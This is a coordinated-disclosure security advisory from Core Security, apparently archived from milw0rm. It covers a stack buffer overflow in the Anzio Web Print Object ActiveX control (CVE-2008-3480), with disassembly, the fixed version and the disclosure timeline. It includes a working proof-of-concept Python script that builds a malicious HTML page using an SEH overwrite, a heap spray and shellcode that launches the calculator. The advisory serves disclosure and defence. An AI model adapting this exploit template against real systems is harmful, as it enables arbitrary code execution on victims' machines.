@@ -1,0 +1,368 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+~      Core Security Technologies - CoreLabs Advisory
+~           http://www.coresecurity.com/corelabs/
+
+~          Anzio Web Print Object Buffer Overflow
+
+
+*Advisory Information*
+
+Title: Anzio Web Print Object Buffer Overflow
+Advisory ID: CORE-2008-0624
+Advisory URL:
+http://www.coresecurity.com/content/anzio-web-print-object-buffer-overflow
+Date published: 2008-08-20
+Date of last update: 2008-08-20
+Vendors contacted: Anzio
+Release mode: Coordinated release
+
+
+*Vulnerability Information*
+
+Class: Buffer overflow
+Remotely Exploitable: Yes (client side)
+Locally Exploitable: No
+Bugtraq ID: 30545	
+CVE Name: CVE-2008-3480	
+
+
+*Vulnerability Description*
+
+Anzio Web Print Object (WePO) is a Windows ActiveX web page component
+that, when placed on a web page can "push" a print job from a file or
+web server to a user's local printer without having to display the HTML
+equivalent to that user. By placing WePO code on a web page, you can
+provide a method whereby the viewer of that web page can request a local
+print of a host resident print job, archived print job or a report
+stream through a server-side script request.
+
+Anzio Web Print Object is vulnerable to a buffer overflow attack, which
+can be exploited by remote attackers to execute arbitrary code, by
+providing a malicious web page with a long "mainurl" parameter for the
+WePO ActiveX component.
+
+
+*Vulnerable Packages*
+
+. Anzio Web Print Object 3.2.19
+. Anzio Web Print Object 3.2.24
+. Anzio Print Wizard Server Edition 3.2.19
+. Anzio Print Wizard Personal Edition 3.2.19
+. Older versions are probably affected too, but were not checked.
+
+
+*Non-vulnerable Packages*
+
+. Anzio Web Print Object 3.2.30
+
+
+*Vendor Information, Solutions and Workarounds*
+
+Update to Anzio Web Print Object 3.2.30, available at
+http://www.anzio.com/download-wepo.htm, or visit the vendor homepage at
+http://www.anzio.com.
+
+
+*Credits*
+
+This vulnerability was discovered and researched by Francisco Falcon
+from Core Security Technologies.
+
+
+*Technical Description / Proof of Concept Code*
+
+The WePO ActiveX component has a parameter named "mainurl" that
+indicates the local file name or the URL from where to retrieve the
+content to print:
+
+/-----------
+
+<param name="mainurl" value="http://www.somewhere.com/myreport.pcl">
+
+- -----------/
+
+WePO takes the value of "mainurl" parameter in OLECHAR format and
+transforms it to a BSTR string using the API SysAllocStringLen from
+oleaut32.dll. The pointer to a BSTR string returned by SysAllocStringLen
+is stored in the stack.
+
+/-----------
+
+024F64B8   . 51             PUSH ECX
+~      ;   length of "mainurl" value
+024F64B9   . 52             PUSH EDX
+~        ;   pointer to "mainurl" value
+024F64BA   . E8 4DB0FFFF    CALL JMP.oleaut32.SysAllocStringLen
+024F64BF   . 5A             POP EDX
+024F64C0   . 85C0           TEST EAX,EAX
+024F64C2   .^0F84 94F9FFFF  JE PWBUTT~1.024F5E5C
+024F64C8   . 8902           MOV DWORD PTR DS:[EDX],EAX
+~        ;  ;Save BSTR pointer to stack
+024F64CA   > C3             RETN
+
+- -----------/
+
+After that, it copies "mainurl" value in ASCII format to a buffer on the
+stack, without validating its length.
+
+/-----------
+
+024F300C  /$ 56             PUSH ESI
+024F300D  |. 57             PUSH EDI
+024F300E  |. 89C6           MOV ESI,EAX
+~        ; ESI = pointer to "mainurl" value
+024F3010  |. 89D7           MOV EDI,EDX
+~        ; EDI = pointer to destination buffer in the stack
+024F3012  |. 89C8           MOV EAX,ECX
+~        ; ECX = length of "mainurl" value
+024F3014  |. 39F7           CMP EDI,ESI
+024F3016  |. 77 13          JA SHORT PWBUTT~1.024F302B
+024F3018  |. 74 2F          JE SHORT PWBUTT~1.024F3049
+024F301A  |. C1F9 02        SAR ECX,2
+024F301D  |. 78 2A          JS SHORT PWBUTT~1.024F3049
+024F301F  |. F3:A5          REP MOVS DWORD PTR ES:[EDI],DWORD PTR
+DS:[ESI]      ; Copy "mainurl" value to stack buffer,
+024F3021  |. 89C1           MOV ECX,EAX
+~        ; without validating its length
+024F3023  |. 83E1 03        AND ECX,3
+024F3026  |. F3:A4          REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]
+024F3028  |. 5F             POP EDI
+024F3029  |. 5E             POP ESI
+024F302A  |. C3             RETN		
+
+- -----------/
+
+By supplying a web page with a long "mainurl" value, an attacker can
+overflow the stack buffer mentioned above and overwrite the SEH
+(Structured Exception Handler), enabling arbitrary code execution on the
+machine that has the WePO ActiveX component installed. The Structured
+Exception Handler can be overwritten by providing a "mainurl" value with
+396 bytes as padding, plus 4 specially chosen bytes that will replace
+the original SEH, allowing execution of arbitrary code with the
+privileges of the current user.
+
+When providing such a long string as value for the "mainurl" parameter,
+an access violation exception is generated when WePO object calls the
+API SysFreeString to deallocate the BSTR string that was previously
+created with SysAllocStringLen. The exception raises because the
+original pointer to the BSTR string was replaced with 4 junk bytes from
+the 396 padding bytes mentioned above.
+
+/-----------
+
+024F5E98  |. 50             PUSH EAX
+024F5E99  |. 52             PUSH EDX
+~        ; junk, should be pointer to BSTR string
+024F5E9A  |. E8 7DB6FFFF    CALL JMP.oleaut32.SysFreeString
+
+- -----------/
+
+At this point, the Structured Exception Handler is already controlled by
+the attacker, so when exception raises the execution is transferred to
+an arbitrary memory address chosen by the person providing the malicious
+web page.
+
+By adding JavaScript code in the malicious web page, the attacker can
+use a technique called Heap Spray, that fills the heap of the browser
+process with his payload, and then jump to the arbitrary code located in
+the process heap.
+
+The following Python code will generate an HTML file that, when opened
+on a machine with Web Print Object installed, will launch the Windows
+Calculator as a proof of the possibility to execute arbitrary code on a
+machine that has the vulnerable ActiveX component installed. This Proof
+of Concept was tested in Windows XP Professional SP2 with Internet
+Explorer 6.0.2900.2180, and Windows XP Professional SP3 with Internet
+Explorer 6.0.2900.3264, but can be easily modified to work in other
+platforms.
+
+/-----------
+
+malicioushtml = open('WePO-PoC.html','w')
+header = '''
+<html>
+<head><title>WePO Buffer Overflow PoC</title>
+</head>
+<body>
+'''
+malicioushtml.write(header)
+objeto = '''
+<OBJECT
+~  classid="clsid:4CE8026D-5DBF-48C9-B6E9-14A2B1974A3D"
+~
+codebase="http://www.anzio.com/controls30/printwizocx.cab#version=3,0,0,0"
+~  width=0
+~  height=0
+~  align=center
+~  hspace=0
+~  id="botontrigger"
+|
+'''
+malicioushtml.write(objeto)
+craftedparam = '<param name="mainurl" value="'
+craftedparam += 'A' * 0x188  #0x188 padding bytes to fill the buffer
+craftedparam += chr(0xFF) * 4   #indicates the end of SEH Chain
+craftedparam += chr(0x0C) * 4   #overwrite the SEH, new value will be
+0x0C0C0C0C
+craftedparam += '">'
+malicioushtml.write(craftedparam)
+jscode = '''
+~  <param name="caption" value="Rompete">
+~  <param name="Cancel" value="0">
+~  <param name="Default" value="0">
+~  <param name="DragCursor" value="-12">
+~  <param name="DragMode" value="0">
+~  <param name="Enabled" value="-1">
+~  <param name="Font" value="MS Sans Serif">
+~  <param name="Visible" value="-1">
+~  <param name="DoubleBuffered" value="0">
+~  <param name="Cursor" value="0">
+~  <param name="licensecode" value>
+~  <param name="printersetup" value="1">
+~  <param name="printername" value="printer">
+~  <param name="charset" value="UTF-8">
+~  <param name="debug" value="0">
+~  <param name="initfile" value>
+~  <param name="orientation" value>
+~  <param name="duplex" value>
+~  <param name="fontname" value>
+~  <param name="overlay" value>
+~  <param name="bitmap" value>
+~  <param name="preview" value="0">
+~  <param name="faxnum" value>
+~  </OBJECT>
+
+<script>
+~  var shellcode =
+unescape("%u0de8%u0000%u6b00%u7265%u656e%u336c%u2e32%u6c64%u006c%u15ff%u108c%u0040%uf08b%u08e8%u0000%u5700%u6e69%u7845%u6365%u5600%u15ff%u1030%u0040%uec81%u0400%u0000%u016a%u09e8%u0000%u6300%u6c61%u2e63%u7865%u0065%ud0ff%u0ce8%u0000%u4500%u6978%u5074%u6f72%u6563%u7373%u5600%u15ff%u1030%u0040%u006a%ud0ff");
+
+~  var spraySlide = unescape("%u9090%u9090");
+~  var heapSprayToAddress = 0x0c0c0c0c;
+
+~  function getSpraySlide(spraySlide, spraySlideSize)
+~  {
+~    while (spraySlide.length*2<spraySlideSize)
+~    {
+~      spraySlide += spraySlide;
+~    }
+~    spraySlide = spraySlide.substring(0,spraySlideSize/2);
+~    return (spraySlide);
+~  }
+
+~  var heapBlockSize = 0x100000;
+~  var SizeOfHeapDataMoreover = 0x5;
+~  var payLoadSize = (shellcode.length * 2);
+
+~  var spraySlideSize = heapBlockSize - (payLoadSize +
+SizeOfHeapDataMoreover);
+~  var heapBlocks = (heapSprayToAddress+heapBlockSize)/heapBlockSize;
+
+~  var memory = new Array();
+~  spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+
+~  for (i=0;i<heapBlocks;i++)
+~  {
+~    memory[i] = spraySlide +  shellcode;
+~  }
+~  document.botontrigger.Click();
+
+</script>
+
+
+</body>
+</html>
+'''
+malicioushtml.write(jscode)
+malicioushtml.close()
+
+- -----------/
+
+
+*Report Timeline*
+
+. 2008-06-27: Core Security Technologies notifies Anzio that there is a
+vulnerability in Web Print Object (WePO).
+. 2008-06-28: Vendor acknowledges notification.
+. 2008-07-01: Core sends an advisory draft, containing technical details
+and Proof of Concept code for the vulnerability.
+. 2008-07-08: Core asks for confirmation of the vulnerability, and
+reminds the vendor that the advisory's publication date is set to July
+14th, 2008.
+. 2008-07-08: Vendor asks Core to resend the report.
+. 2008-07-14: Core sends (again) the advisory draft, and asks for
+information about the vendor's plan for fixing the vulnerability.
+. 2008-07-21: Core asks for updated information, and notifies the vendor
+that the advisory's publication date has been rescheduled for August 4th.
+. 2008-07-21: Vendor asks Core to resend the report.
+. 2008-07-21: Core sends (for the third time) the advisory draft as a
+compressed file.
+. 2008-07-21: Vendor confirms reception of the reports and states that
+the problem has been identified.
+. 2008-07-31: Core asks for updated information about the release of
+fixed versions (no reply received).
+. 2008-08-04: Core asks for updated information, and reschedules the
+publication of the advisory to August 11th 2008 (no reply received).
+. 2008-08-11: Core makes a phone call to the vendor, asking one more
+time for a release date of fixed versions. Vendor informs that new
+versions will be released during the week.
+. 2008-08-15: Vendor releases fixed version Anzio Web Print Object 3.2.30.
+. 2008-08-20: Advisory CORE-2008-0624 is published.
+
+
+*About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://www.coresecurity.com/corelabs/.
+
+
+*About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+http://www.coresecurity.com.
+
+
+*Disclaimer*
+
+The contents of this advisory are copyright (c) 2008 Core Security
+Technologies and (c) 2008 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper credit
+is given.
+
+
+*GPG/PGP Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.8 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iEYEARECAAYFAkisi0kACgkQyNibggitWa06LwCePQwBxufs6dhNnpGCbV5ceQ1A
+XBwAn2RPeKeyz9ziw5a0BbjIQ5Sggvuy
+=9eOd
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2008-08-20]
